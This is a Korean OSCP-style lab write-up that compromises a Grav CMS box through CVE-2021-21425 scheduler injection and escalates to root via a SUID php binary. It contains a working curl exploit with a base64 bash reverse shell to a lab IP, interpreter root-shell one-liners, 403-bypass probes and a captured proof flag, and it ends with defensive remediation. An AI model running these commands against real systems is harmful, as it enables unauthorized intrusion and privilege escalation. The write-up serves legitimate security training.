> 이 RCE는 즉시 발화하지 않는다. 시스템 crontab의
> ```
> * * * * * cd /var/www/html/grav-admin; /usr/bin/php bin/grav scheduler
> ```
> 이 1분마다 스케줄러를 돌릴 때 비로소 잡이 실행된다.
> **5초 보고 "안 되네" 하면 안 된다.** 크론 기반 RCE는 최소 1주기(여기선 60초)를 기다린다.

### 3-3. ⚠️ 시험 대비 — 자동화 없이 같은 결과 얻기

> [!danger] ⚠️ 시험 금지 도구 — Metasploit 모듈 `49788.rb`
> exploit-db에 있는 두 익스플로잇의 성격이 다르다. **어느 쪽을 쓰느냐가 시험에서 갈린다.**
> | 파일 | 형태 | 시험 |
> |---|---|---|
> | `49788.rb` | **Metasploit 모듈** | **1대 한정 제한에 소모된다.** 이런 저난도 박스에 쓰면 낭비 |
> | `49973.py` | 독립 Python 스크립트 | **허용** — 수동 스크립트 범주 |
> | 아래 `curl` 절차 | 순수 수동 | **항상 허용** |
>
> 원칙: **msf 1대 카드는 진짜 막혔을 때를 위해 아껴라.** 공개 파이썬 익스가 있으면 그쪽을 쓴다.

`.py` 익스플로잇도 못 쓰는 상황(파이썬 의존성 깨짐, 스크립트가 구버전 API를 씀)을 대비한 **순수 curl 2단계 절차**:

```bash
# ① nonce 확보 — 전제조건 확인을 겸한다
NONCE=$(curl -s http://192.168.248.12/grav-admin/admin \
        | grep -oE 'admin-nonce" value="[a-f0-9]+"' | grep -oE '[a-f0-9]{32}')
echo "$NONCE"

# ② 페이로드 준비 (인용 지옥 회피 — 2-4 참조)
REV=$(echo -n 'bash -i >& /dev/tcp/192.168.45.207/4444 0>&1' | base64 -w0)
PHP=$(echo -n "system(base64_decode('$REV'));" | base64 -w0)

# ③ 스케줄러 잡 삽입
curl -s -o /dev/null -w 'HTTP=%{http_code}\n' \
  -X POST 'http://192.168.248.12/grav-admin/admin/config/scheduler' \
  --data-urlencode "admin-nonce=$NONCE" \
  --data-urlencode 'task=SaveDefault' \
  --data-urlencode 'data[custom_jobs][ncefs][command]=/usr/bin/php' \
  --data-urlencode "data[custom_jobs][ncefs][args]=-r eval(base64_decode(\"$PHP\"));" \
  --data-urlencode 'data[custom_jobs][ncefs][at]=* * * * *' \
  --data-urlencode 'data[status][ncefs]=enabled'
```

> [!warning] `[가정]` 위 폼 필드명은 **저장된 YAML 구조에서 역산한 것**이다
> 실제로 관측된 확정 사실은 ① 노출된 nonce 값 ② `task=SaveDefault` ③ 저장 결과 YAML의 키 구조(`command`/`args`/`at`/`status: { ncefs: … }`) ④ 정리 시 쓴 `custom_jobs: {}` / `status: {}` 다.
> **`data[custom_jobs][…]` 라는 폼 파라미터 표기는 Grav의 일반적인 설정 폼 규약에서 유추한 것이고, 타겟이 정지되어 재검증할 수 없다.** 시험장에서 이 방식을 쓸 때는 **응답이 아니라 잡이 도는지로 검증**해야 하며(응답은 어차피 로그인 페이지다), 안 되면 익스플로잇 스크립트의 요청 본문을 그대로 베끼는 것이 확실하다.
>
> 실전 팁: **스크립트를 못 쓰겠으면 스크립트를 읽어라.** `grep -n 'data\[' 49973.py` 한 줄이면 정확한 필드명이 나온다. 익스플로잇을 실행하는 것과 익스플로잇에서 요청 형식을 베끼는 것은 다른 일이다.

`--data-urlencode`를 쓰는 이유: 페이로드에 `*`·공백·`(`·`)`·`"`가 들어간다. 직접 인코딩하면 반드시 실수한다 — curl에게 맡긴다.

### 3-4. 셸 도착

```bash
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.12] 43552
www-data@gravity:~/html/grav-admin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@gravity:~/html/grav-admin$ uname -a
Linux gravity 5.4.0-146-generic #163-Ubuntu SMP Fri Mar 17 18:26:02 UTC 2023 x86_64 GNU/Linux
```

> [!tip] 셸이 붙자마자 칠 다섯 줄
> ```bash
> id                                  # 나는 누구인가
> sudo -l                             # 무료 티켓이 있는가 (비번 없이 되는 것)
> find / -perm -4000 -type f 2>/dev/null   # SUID  ← 이 박스의 정답
> getcap -r / 2>/dev/null             # capability
> cat /etc/crontab; ls -la /etc/cron.*     # 크론
> ```
> 이 박스는 **세 번째 줄에서 끝난다.** 순서를 지키면 30초다.
>
> 그리고 **크론을 확인하는 습관이 여기서 이중으로 값지다** — 우리가 셸을 얻은 경로 자체가 크론이므로, `/etc/crontab`을 보면 `bin/grav scheduler` 줄이 나오고 **왜 60초가 걸렸는지 사후에 확인**된다.

---

## 4. 권한상승 — SUID `php7.4`

### 4-1. 열거로 무엇을 발견했는가

```bash
www-data@gravity:~$ find / -perm -4000 -type f 2>/dev/null
/snap/core20/1852/usr/bin/{chfn,chsh,gpasswd,mount,newgrp,passwd,su,sudo,umount}
/snap/core20/1611/usr/bin/{chfn,chsh,gpasswd,mount,newgrp,passwd,su,sudo,umount}
/snap/snapd/18596/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/at
/usr/bin/su
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/php7.4          ← 비표준. 이것 하나만 보면 된다
/usr/bin/gpasswd
```

> [!note] `find` 플래그 해설
> | 조각 | 역할 | 빼면 |
> |---|---|---|
> | `-perm -4000` | **setuid 비트가 켜진 것**. 앞의 `-`는 "이 비트를 포함"(정확히 일치가 아니라) | `-perm 4000`(하이픈 없음)은 **퍼미션이 정확히 `4000`**인 것만 — 실질적으로 아무것도 안 나온다 |
> | `-type f` | 일반 파일만 | 디렉터리·심볼릭 링크 노이즈가 섞인다 |
> | `2>/dev/null` | `Permission denied` 억제 | **stderr가 수백 줄** 쏟아져 결과를 못 찾는다 |
>
> setgid도 같이 보려면 `-perm -u=s -o -perm -g=s`. 시간이 없으면 SUID만 먼저 본다.

### 4-2. 노이즈를 걷어내는 법 — 우분투 기본 SUID 목록

> [!tip] SUID 목록에서 노이즈를 걷어내는 법
> `/snap/core20/...` 두 벌은 **같은 스냅 리비전의 중복**이라 통째로 노이즈다. `chfn`·`chsh`·`gpasswd`·`mount`·`umount`·`newgrp`·`passwd`·`su`·`sudo`·`fusermount`·`ssh-keysign`·`polkit-agent-helper-1`·`dbus-daemon-launch-helper`는 **우분투 기본 SUID**다.
> 남는 것: **`/usr/bin/php7.4`** (인터프리터!) 와 `/usr/bin/at`.
> **인터프리터(php·python·perl·ruby)나 `find`·`vim`·`tar` 류가 SUID로 걸려 있으면 그 즉시 끝난다.** 기본 목록을 외워두면 3초 만에 골라낼 수 있다.

외워둘 값이 있는 **우분투/데비안 기본 SUID 14종** (이 박스에서 실제로 걷어낸 것 그대로):

| 분류 | 바이너리 |
|---|---|
| 계정/암호 | `passwd` · `chfn` · `chsh` · `gpasswd` · `newgrp` · `su` |
| 권한 위임 | `sudo` · `pkexec`(*) · `polkit-agent-helper-1` |
| 마운트 | `mount` · `umount` · `fusermount` |
| 기타 | `ssh-keysign` · `dbus-daemon-launch-helper` · `snap-confine` · `dmcrypt-get-device` |

(*) `pkexec`은 기본 SUID지만 **버전에 따라 CVE-2021-4034(PwnKit)** 자체가 권한상승이다 — [[Exghost]]에서 그 경로를 썼다. **"기본이니까 무시"가 아니라 "기본이지만 버전을 본다"**가 정확한 태도다.

> [!warning] 노이즈 걷어내기를 자동화할 때의 함정
> `linpeas`류는 비표준 SUID를 노란색/빨간색으로 강조해준다. 편하지만 **강조 규칙이 최신 배포판을 못 따라가면 진짜 항목을 놓친다.**
> 수동 대조가 확실하다:
> ```bash
> find / -perm -4000 -type f 2>/dev/null | grep -v '^/snap/' | sort > /tmp/s.txt
> # 알려진 기본 목록과 눈으로 대조 — 20줄이면 3초다
> ```
> **`grep -v '^/snap/'` 한 줄만으로 이 박스의 목록이 절반으로 준다.**

### 4-3. 왜 SUID 인터프리터가 곧 root인가

```bash
www-data@gravity:~$ ls -la /usr/bin/php7.4
-rwsr-xr-x 1 root root 4786104 Feb 23  2023 /usr/bin/php7.4

www-data@gravity:~$ /usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

`-rwsr-xr-x`의 **`s`**가 소유자 실행 비트 자리에 있다 = setuid. 소유자가 `root`이므로, 누가 실행하든 프로세스의 **euid가 0**이 된다.

인터프리터가 SUID면 왜 즉시 끝나는가 — **인터프리터의 존재 목적이 "임의의 코드를 실행하는 것"**이기 때문이다. 일반 바이너리가 SUID면 그 바이너리가 제공하는 기능 안에서 탈출로를 찾아야 하지만(GTFOBins가 하는 일), 인터프리터는 탈출로를 찾을 필요가 없다. **그냥 코드를 쓰면 된다.**

| 인터프리터 | root 셸 한 줄 |
|---|---|
| `php` | `php -r "pcntl_exec('/bin/sh', ['-p']);"` |
| `python` | `python -c 'import os; os.execl("/bin/sh","sh","-p")'` |
| `perl` | `perl -e 'exec "/bin/sh", "-p";'` |
| `ruby` | `ruby -e 'exec "/bin/sh", "-p"'` |

**전부 `-p`가 붙는다.** 이유는 다음 절이다.

### 4-4. `-p`의 정확한 의미

> [!danger] `-p`가 없으면 실패한다
> `pcntl_exec('/bin/sh', ['-p'])` 의 `-p`는 **privileged 모드**다. 이게 없으면 `/bin/sh`(dash/bash)가 **"euid ≠ uid이면 특권을 드롭한다"**는 자체 보호 동작을 실행해서, 애써 얻은 euid 0이 즉시 날아간다.
> GTFOBins의 `-p`는 장식이 아니다. SUID 셸 계열(`bash -p`, `sh -p`)에서 전부 동일하다.

메커니즘을 한 단계 더 파면 이렇다:

```
프로세스는 uid(실제 사용자)와 euid(유효 사용자)를 따로 갖는다.

SUID 바이너리 실행 시:   uid=33(www-data)   euid=0(root)
                                   ↑ 불일치

bash/dash는 시작할 때 이 불일치를 감지하면
    setuid(getuid())  를 호출해서 euid를 uid로 되돌린다   ← 자기방어
    → euid=33 이 되어 root 권한 소멸

-p (privileged) 를 주면 이 되돌리기를 건너뛴다
    → euid=0 유지
```

이것은 **`/bin/sh`가 SUID 스크립트의 인터프리터로 악용되는 것을 막으려고 넣은 방어**다. 우리는 인터프리터(php)를 통해 셸을 부르므로 그 방어를 명시적으로 꺼야 한다.

`euid=0`이면 `/root` 읽기에는 충분하다. (`uid`까지 0으로 만들려면 `posix_setuid(0)`를 먼저 호출한다)

```php
php -r "posix_setuid(0); posix_setgid(0); pcntl_exec('/bin/sh', ['-p']);"
```

> [!tip] `euid=0`으로 충분한 경우와 아닌 경우
> | 상황 | `euid=0`만으로 되나 |
> |---|---|
> | `/root/proof.txt` 읽기 | **된다** — 파일 접근 검사는 euid로 한다 |
> | 파일 쓰기·소유권 변경 | **된다** |
> | `ssh` 키 심고 root 로그인 | 된다 |
> | 일부 프로그램의 자체 uid 검사(`sudo`, `su`, `screen`) | **안 될 수 있다** → `posix_setuid(0)` 필요 |
> | `passwd` 변경 | 안 될 수 있다 |
>
> **시험 증거 수집에는 `euid=0`으로 충분하다.** 하지만 `id` 출력에 `uid=33`이 남으면 채점자가 갸웃할 수 있으니 `posix_setuid(0)`으로 깔끔하게 만드는 편이 낫다.

### 4-5. 대안 경로 — `/usr/bin/at`

노이즈를 걷어낸 뒤 남은 것이 `php7.4` **와 `at`** 둘이었다. `at`은 우분투에서 기본 설치가 아니므로 살펴볼 가치가 있었다.

| 경로 | 즉시성 | 신뢰성 | 판정 |
|---|---|---|---|
| **SUID `php7.4`** | **즉시** | 인터프리터라 실패 요인이 없다 | **채택** |
| SUID `at` | 지연(작업 큐) | `atd` 데몬이 돌아야 하고, `/etc/at.deny`에 `www-data`가 있으면 거부 | 보류 |

**즉시 실행되는 경로를 항상 먼저 시도한다.** 크론으로 이미 60초를 기다린 뒤라, 여기서 또 지연 경로를 고르면 시간이 두 배로 든다.

---

## 5. 플래그

```bash
# cat /root/proof.txt
df08cc108a6bd0c2739fa0e24fc52f89
# cat /root/flag1.txt
T2Zmc2Vj                      # base64 → "Offsec"  ← 미끼
# find / -name local.txt 2>/dev/null
       (없음)
```

| | |
|---|---|
| `proof.txt` | `df08cc108a6bd0c2739fa0e24fc52f89` |
| `local.txt` | **존재하지 않음** — 플래그 1개 박스 |
| `/root/flag1.txt` | `T2Zmc2Vj` = `Offsec` — **장식용 더미** |

`/home/alex/`는 dotfile만 있고 비어 있다. 포털 진행도 `0/1`이 이미 알려준 사실이다.

> [!tip] 시험 증거 형식 연습
> 실제 시험에서는 플래그를 **한 화면에** 이렇게 찍어야 인정된다:
> ```bash
> whoami; hostname; ip a; cat /root/proof.txt
> ```
> 이 박스는 `euid=0`인 셸이므로 `whoami`가 `root`로 나온다(whoami는 euid를 본다). 다만 `id` 출력에는 `uid=33`이 남으니, 스크린샷용으로는 `posix_setuid(0)`를 먼저 걸어 `uid=0(root)`을 만들어두는 것이 안전하다.

> [!warning] 더미 플래그 판별법
> **PG/OSCP 플래그는 32자 소문자 hex다.** `T2Zmc2Vj`처럼 길이·문자셋이 다르면 플래그가 아니다.
> ```bash
> grep -rEo '\b[0-9a-f]{32}\b' /root /home 2>/dev/null
> ```
> 미끼 파일에 시간을 쓰지 마라 — 형식만 봐도 즉시 걸러진다.

---

## 6. 막혔던 지점 / 시행착오

### ① `200` + 로그인 페이지 — 여기서 접었으면 박스를 놓쳤다

가장 값진 지점이다. 익스플로잇이 뱉은 것은 이것뿐이었다:

```
[+] status: 200 len: 15592
<title>Grav Admin Login | Grav</title>
```

**정상적인 판단이라면 "인증에 실패했다 = 익스가 안 통했다"**로 읽힌다. 실제로 그 판단은 두 층에서 틀렸다:

| 오해 | 사실 |
|---|---|
| "로그인 페이지 = 거절당했다" | 거절당한 건 맞다. **하지만 거절 전에 쓰기가 끝났다** |
| "200이면 뭔가 성공했겠지" | 200/302/403/500 어느 것도 이 공격의 성패와 무관하다 |

**어떻게 알아챘는가**: 취약점 설명이 "Unauthenticated Arbitrary YAML Write"였다는 것. **이름에 이미 답이 있었다** — 비인증으로 쓸 수 있다는 뜻이고, 그러면 인증 실패 응답이 나오는 게 오히려 자연스럽다.

**일반화**: 익스플로잇을 던지기 전에 **"이 취약점이 성공했을 때 응답이 어떻게 보일 것인가"를 먼저 예측**해두면 오판이 없다. 예측이 안 서면 그건 CVE를 이해 못 한 것이고, 그 상태로 던지면 결과를 해석할 수 없다.

### ② 60초를 안 기다렸으면 "안 되네" 하고 다른 경로를 팠다

①과 겹쳐서 위험이 두 배였다. **응답도 실패처럼 보이고, 셸도 즉시 안 붙는다.** 두 신호가 같은 방향(실패)을 가리키므로 확신을 갖고 잘못된 결론을 내리기 쉽다.

```
t=0s   익스 실행 → 로그인 페이지 200        "실패 같은데?"
t=5s   리스너 조용                          "역시 실패네"
t=30s  다른 경로 탐색 시작                  ← 여기서 박스를 놓친다
t=60s  (셸이 붙었지만 이미 다른 창을 보고 있다)
```

**대응**: 리스너를 `tmux` 분리 세션에 띄워두면 다른 작업을 하면서도 셸이 살아 있다. 위 명령이 `tmux new-session -d`인 이유가 이것이다. **"실패한 것 같아도 리스너는 끄지 마라."**

**일반화 규칙**: 익스플로잇 후 판정 시한을 **경로 유형별로** 정해둔다.
| 유형 | 최소 대기 |
|---|---|
| 인라인 RCE(웹셸·명령 주입) | 5초 |
| **크론/스케줄러** | **2주기** (여기선 120초) |
| 이메일/큐 트리거 | 5분 |
| 관리자 시뮬레이션(XSS) | 15분 |

### ③ GitHub `published_at`에 속을 뻔했다 — 버전 추론이 뒤집힐 뻔

Releases API가 admin 1.10.7을 **2021-03-19**로 표시했다. 코어 1.7.8은 03-17이다. 그대로 믿으면:

> "코어가 03-17에 나왔는데 플러그인 1.10.7은 03-19다 → **1.7.8 번들에 1.10.7이 들어 있을 리 없다** → 우리 판정이 틀렸다"

라는 **완전히 잘못된 결론**에 도달한다. 실제로는 태그 커밋이 89초 차이로 **플러그인이 먼저**였다.

**어떻게 알아챘는가**: 정적 자산 blob 해시 대조(근거 3개)가 1.10.7을 가리키는데 날짜만 어긋나서, **증거끼리 충돌**했다. 충돌이 났을 때 어느 쪽을 버릴지 판단해야 했고, **콘텐츠 해시(변조 불가) > 릴리스 메타데이터(사후 편집 가능)** 순서로 정리했다.

**일반화**: 시간 정보의 신뢰도 서열을 기억하라.
```
git 태그/커밋 커밋터 날짜  >  파일시스템 mtime  >  릴리스 페이지 published_at  >  블로그/기사 날짜
```
릴리스 페이지 날짜는 **소급 등록·재발행으로 언제든 바뀐다.**

### ④ 403에서 멈췄으면 버전 판정 근거가 하나 줄었다

`vendor/composer/installed.php` → **403**. 여기서 "vendor는 막혀 있구나" 하고 넘어가면 `installed.json`(200, 126KB, 51개 패키지)을 못 얻는다.

**어떻게 알아챘는가**: 403이 **경로 단위가 아니라 확장자 단위**로 보이는 것이 이상해서 `.htaccess` 규칙 형태를 추정해봤다. 화이트리스트에 `json`이 없다는 것을 확인하고 곧바로 요청했다.

**일반화**: 403을 만나면 **차단이 무엇을 기준으로 하는지** 세 가지를 시험한다.
```bash
# 1. 확장자 기준인가
curl -o/dev/null -w'%{http_code}\n' TARGET/path/file.php
curl -o/dev/null -w'%{http_code}\n' TARGET/path/file.json
# 2. 경로 기준인가 (대소문자·트래버설로 정규화 차이 유발)
curl -o/dev/null -w'%{http_code}\n' TARGET/Vendor/composer/installed.php
curl -o/dev/null -w'%{http_code}\n' TARGET/./vendor/composer/installed.php
# 3. 메서드/헤더 기준인가
curl -o/dev/null -w'%{http_code}\n' -X HEAD TARGET/path/file.php
```
`.json`·`.lock`·`.map`·`.bak`·`.dist`·`.orig`·`.swp`·`.example`가 상습 누락 대상이다.

### ⑤ SUID 목록 20줄에서 눈이 미끄러진다

`find / -perm -4000`의 출력은 **정답이 그 안에 있는데도 못 찾기 쉬운** 형태다. `/snap/core20/` 두 벌이 시각적으로 큰 자리를 차지하고, 나머지는 전부 익숙한 이름이라 눈이 훑고 지나간다.

**대응은 필터링이 아니라 "기본 목록 암기"다.** 기본 14종을 알면 나머지를 **읽는** 게 아니라 **지운다**. 남은 것만 본다. 이 박스는 그러면 두 줄이다.

### ⑥ 이 유형에서 흔히 막히는 지점 (원문 시행착오가 아닌 일반 함정)

> [!note] 아래는 이 박스에서 실제로 겪은 것이 아니라, **동일 유형에서 반복적으로 보고되는 실패 패턴**이다. 구분해서 읽을 것.

| 함정 | 증상 | 대응 |
|---|---|---|
| **`status`/`enabled` 키 누락** | 잡이 저장은 됐는데 영원히 안 돈다. 에러 없음 | 설정 스키마에서 활성화 키를 확인. 저장 후 다시 GET 해서 값 확인 |
| **`at:` 주기를 잘못 씀** | `*/1 * * * *`는 되지만 오타로 `* * * * * *`(6필드)면 파서가 거부 | 크론은 **5필드**. 초 단위 필드는 없다 |
| **`command`에 상대경로** | 스케줄러의 PATH가 로그인 셸과 다르다 | 항상 절대경로(`/usr/bin/php`) |
| **리버스셸이 크론 잡을 물고 늘어짐** | 셸은 붙는데 다음 주기 잡이 안 돈다 / 셸이 죽으면 재발사가 안 됨 | 백그라운드로 던진다: `( bash rev.sh & )` — [[Exfiltrated]]에서 같은 처리 |
| **아웃바운드 포트 차단** | 60초를 기다려도 안 붙는다 (크론 문제로 오인) | 4444 대신 **443·80·53** 시도. [[Hawat]]에서 실제로 발생 |
| **nonce 만료** | 첫 시도는 됐는데 재시도가 안 됨 | 매 요청마다 nonce를 **새로 긁어서** 쓴다. 스크립트가 캐싱하면 문제 |
| **웹루트가 읽기 전용** | 다른 Grav 익스(파일 쓰기형)를 시도하면 실패 | `user/config/` 쓰기 권한은 별개. **이 CVE는 웹루트가 아니라 설정 디렉터리를 노린다** |

### ⑦ 셸을 잡은 직후에 해야 할 일을 미루면 손해다 (일반 함정)

> [!note] 아래도 이 박스의 실제 시행착오가 아니라 **크론 발화형 foothold에서 공통으로 겪는 상황**이다.

셸이 붙은 순간 **1분 뒤 같은 잡이 또 돈다.** 방치하면 두 가지가 벌어진다.

| 증상 | 원인 | 대응 |
|---|---|---|
| 매분 새 커넥션이 리스너에 쌓인다 | 잡이 여전히 `enabled` | 첫 셸에서 즉시 `scheduler.yaml` 백업 후 잡 비활성화 |
| 셸이 갑자기 끊긴다 | 다음 주기 잡이 같은 포트로 붙으며 세션이 엉킴 | 안정 셸을 **다른 포트/다른 수단(SSH 키)** 으로 확보 후 잡 제거 |
| 잡이 스케줄러 전체를 물고 늘어짐 | 리버스셸이 포그라운드라 `bin/grav scheduler`가 반환하지 않음 | 페이로드를 처음부터 `( ... & )` 백그라운드로 |

이 박스에서는 **셸 확보 후 원본 백업(`scheduler.yaml.bak-exploit`)을 남기고 잡을 비활성화**하는 처리를 실제로 했다(아래 "남긴 흔적" 참조). 순서를 지킨 덕에 위 세 증상을 겪지 않았다.

**일반화**: 지속성 아티팩트를 심는 익스플로잇은 **성공한 직후가 정리 시점**이다. 나중에 하려고 미루면 ① 잊어버리고 ② 그 사이 셸이 불안정해진다.

### ⑧ TTY가 없다 — 크론에서 태어난 셸의 공통 성질

크론이 발화시킨 프로세스는 **터미널이 없다**. 그래서 붙은 리버스셸도 처음엔 raw 상태다. `su`·`ssh`·`sudo`·`vim`·탭 완성이 전부 안 된다.

```bash
# 표준 업그레이드 (python3가 있는 우분투 계열)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# 이어서 (Ctrl+Z 로 백그라운드 후)
stty raw -echo; fg
export TERM=xterm

# python3가 없으면
script -qc /bin/bash /dev/null        # [[Hawat]]에서 통한 방법
perl -e 'exec "/bin/bash";'
```

이 박스는 Ubuntu 20.04라 `python3`가 있다. **`rlwrap`을 리스너에 걸어둔 덕에 업그레이드 전에도 히스토리·백스페이스가 먹었다** — 3-1의 `rlwrap`이 여기서 값을 한다.

> [!warning] 권한상승 후에도 TTY 문제가 남는다
> `pcntl_exec('/bin/sh', ['-p'])` 로 얻은 root 셸은 **프롬프트가 `#` 하나뿐**이고 역시 TTY가 아니다.
> 원문 출력에서 `# id` 로만 보이는 이유가 이것이다. 플래그 증거 스크린샷을 찍기 전에 TTY를 먼저 정리해두면 `hostname`·`ip a`가 깔끔하게 한 화면에 담긴다.

### ⑨ 시간 배분 — 어디서 손절했어야 하는가

| 단계 | 적정 시간 | 손절 기준 |
|---|---|---|
| Nmap `-p-` | 3분 | — (백그라운드로 돌리고 다음 진행) |
| Grav 식별 + 버전 판정 | **10~15분** | 근거 2개가 일치하면 즉시 익스로 넘어간다. **3개는 사치다** |
| `searchsploit` + CVE 읽기 | 5분 | — |
| 익스 실행 + **대기** | **최소 2분** | **2주기를 기다리기 전에는 절대 실패로 판정하지 않는다** |
| 권한상승 열거 | 3분 | `find -perm -4000`에서 비표준이 나오면 끝. 안 나오면 커널/크론/`sudo -l`로 |
| **합계** | **~30분** | Fundamental 난이도 박스의 목표선 |

> [!danger] 이 박스에서 시간을 태울 수 있는 곳은 딱 하나
> **버전 판정에 근거 3개를 모으는 데 쓴 시간.** 학습 목적으로는 훌륭하지만, 시험장에서는 **근거 2개(예: `installed.json` + 정적 자산 해시)면 충분**하고 나머지는 익스를 던진 뒤 실패했을 때 돌아와서 하면 된다.
> **판정의 정확도를 높이는 것보다 "틀렸을 때 빨리 알아채는 구조"를 만드는 것이 시험에서는 더 싸다.** 여기서는 그게 "리스너를 tmux에 띄워두고 다음 작업으로 넘어가기"다.

---

## 7. OSCP 시험 관점

1. **403은 규칙의 누락을 찾으라는 신호다.** Grav `.htaccess`의 확장자 목록에 `json`이 빠져 있어서, 같은 디렉터리의 `.php`가 403인데 `installed.json`은 200으로 51개 패키지 버전을 통째로 내줬다. **`.json`·`.lock`·`.map`·`.bak`·`.dist`가 상습 누락 대상**이다. 스캐너가 403을 버리지 않도록 `-mc`를 손봐라.
2. **URL에 `#`(`%23`) 하나로 500을 유발**해 Whoops 백트레이스 218KB를 얻었다. 웹루트 절대경로와 스택 프레임이 전부 나온다. 에러 유발은 이제 열거 초반 루틴으로 굳혔다. 후보: `%23` · `%00` · `%2e%2e%2f` · 배열 파라미터(`a[]=1`) · 초장문 값.
3. **릴리스 페이지 날짜 ≠ 커밋 날짜.** GitHub Releases의 `published_at`은 소급 등록될 수 있다. 버전을 시간순으로 추론할 때는 **태그 커밋 날짜**를 봐라. 증거가 충돌하면 **콘텐츠 해시 > 파일 메타데이터 > 릴리스 날짜** 순으로 신뢰한다.
4. **코어와 플러그인의 버전을 따로 판정하라.** CVE-2021-21425는 admin 플러그인(1.10.7) 취약점이지 코어(1.7.8) 취약점이 아니다. WordPress·Jenkins·Confluence에서 똑같이 반복된다.
5. **익스플로잇 전에 전제조건을 한 줄로 확인한다.** `curl ... | grep admin-nonce` 로 nonce 노출을 먼저 봤다. 안 나왔으면 이 경로는 버려야 한다. 익스플로잇을 던지고 나서 왜 안 되는지 고민하는 것보다 훨씬 싸다.
6. **HTTP 응답이 공격 성공을 뜻하지 않는다.** `200` + 로그인 페이지가 돌아왔지만 쓰기는 이미 끝나 있었다. 취약점이 **인증 체크보다 앞선 지점**에 있으면 응답은 정상 흐름을 그대로 보여준다. **부작용으로 판정하라.** ([[Crane]] · [[RubyDome]] · [[Exghost]] · [[Hawat]]와 같은 계열)
7. **크론 기반 RCE는 기다려야 한다.** 최소 1주기(여기선 60초), 판정은 2주기 뒤에. 즉시 반응이 없다고 실패로 결론내면 안 된다. 반대로 말하면, **셸이 늦게 붙는 박스는 크론을 의심**한다. ([[Exfiltrated]] · [[Muddy]])
8. **리스너는 `tmux` 분리 세션에 띄운다.** "실패한 것 같아 다른 경로를 파는 동안" 셸이 붙는 상황이 실재한다. 리스너를 끄면 그 셸은 영영 없다.
9. **SUID 목록은 기본값을 걷어내고 봐야 한다.** `/snap/core20/*` 중복과 우분투 기본 SUID 14종을 지우면 `php7.4` 하나가 남는다. **인터프리터가 SUID면 그 즉시 root다.** `grep -v '^/snap/'`부터 건다.
10. **GTFOBins의 `-p`를 빠뜨리지 마라.** 셸은 euid ≠ uid일 때 `setuid(getuid())`로 스스로 특권을 드롭한다. `sh -p` / `bash -p`가 이걸 막는다. `id`에 `uid=0`까지 필요하면 `posix_setuid(0)`.
11. **더미 플래그에 속지 마라.** `/root/flag1.txt`의 `T2Zmc2Vj`는 디코드하면 그냥 `Offsec`이다. **32자 hex가 아니면 플래그가 아니다.**
12. **⚠️ 시험 금지/제한 도구와 수동 대안**
    | 도구 | 시험 | 수동 대안 |
    |---|---|---|
    | **Metasploit 모듈 `49788.rb`** | **1대 제한에 소모** — 저난도 박스에 쓰지 마라 | `49973.py`(허용) 또는 §3-3의 `curl` 절차 |
    | msf `multi/handler` | 제한에 포함 | `rlwrap nc -lvnp 4444` |
    | AutoRecon 등 자동 정찰 | **금지** | `nmap -p- --min-rate` → 열린 포트에 `-sCV` 2단계 |
    | linpeas 자동 강조 | 실행은 허용되나 신뢰하지 마라 | `id` · `sudo -l` · `find -perm -4000` · `getcap -r /` · `cat /etc/crontab` 다섯 줄 |
    | 익스플로잇 스크립트 실행 | **허용**(수동 스크립트) | — 단, **읽고 나서 써라.** 요청 형식을 베끼면 curl로 재현 가능 |
13. **막혔을 때의 다음 후보 경로** (이 박스에서 Grav 경로가 실패했다면):
    - `Grav CMS 1.7.10 SSTI`(EDB 49961) — 코어가 1.7.8이라 미해당이지만, **Twig 템플릿 주입은 Grav의 다른 표면**
    - 22/tcp — 웹에서 얻은 이름(`alex`)으로 약한 자격증명 시도
    - Apache 2.4.41 자체 — 이 버전대는 결정적 RCE가 없다. **여기에 시간 쓰지 마라**
    - `user/accounts/*.yaml` — Grav는 계정도 flat file이다. 읽기가 되면 해시가 나온다

---

## 8. 방어 관점

| 결함 | 조치 |
|---|---|
| **`task=SaveDefault`가 인가 검사 전에 실행** | **인가 검사를 라우팅 직후·태스크 디스패치 전으로 이동.** 프레임워크라면 미들웨어 순서를 강제하고, 태스크 핸들러 진입점에 단일 게이트를 둔다. 이 하나만 고쳤어도 CVE 전체가 성립하지 않는다 |
| CSRF nonce가 비인증 페이지에서 노출·재사용 | 토큰을 **세션에 바인딩**하고 단발성으로 만든다. 로그인 폼 토큰과 관리 태스크 토큰을 **분리** |
| `.htaccess` 확장자 **화이트리스트** 방식 차단 | 화이트리스트가 아니라 **디렉터리 전체 거부**(`Require all denied`)로 전환. `vendor/`·`system/`은 웹에서 접근할 이유가 없다. 더 나은 방법은 **웹루트를 `public/`로 분리**해 코드가 문서 루트 밖에 있게 하는 것 |
| 프로덕션에서 **Whoops 디버그 페이지 노출** | `system.errors.display: false`. 스택 트레이스·절대경로·의존성 버전이 그대로 새어나간다 |
| Apache **디렉터리 리스팅 활성** | `Options -Indexes`. 파일명과 **타임스탬프**가 버전 판정 재료가 된다 |
| Grav 코어/플러그인 미패치 (admin 1.10.7) | **admin 플러그인 ≥1.10.8**로 업데이트. 코어만 올리면 안 된다 |
| **`/usr/bin/php7.4`에 SUID 비트** | `chmod u-s /usr/bin/php7.4`. 인터프리터에 SUID는 **어떤 정당한 이유도 없다.** 특정 스크립트만 특권이 필요하면 `sudoers`에 **인자까지 고정**해 등록하거나 capability로 최소화 |
| 시스템 crontab이 웹 애플리케이션 코드를 실행 | 불가피하다면 **전용 저권한 계정**으로 실행하고, 스케줄러 설정 파일을 웹 프로세스가 **쓸 수 없게** 한다(`www-data`는 읽기만) |
| `user/config/`가 웹 프로세스 쓰기 가능 | 설정 디렉터리를 배포 계정 소유로 두고 런타임 쓰기를 차단. **"설정 파일 쓰기 = 명령 실행"이 성립하는 구조 자체를 끊는다** |
| 탐지 | `scheduler.yaml`·`user/config/*` 변경에 **파일 무결성 모니터링**(auditd/AIDE). 이 공격은 조용하지만 파일 변경 이벤트는 반드시 남는다 |
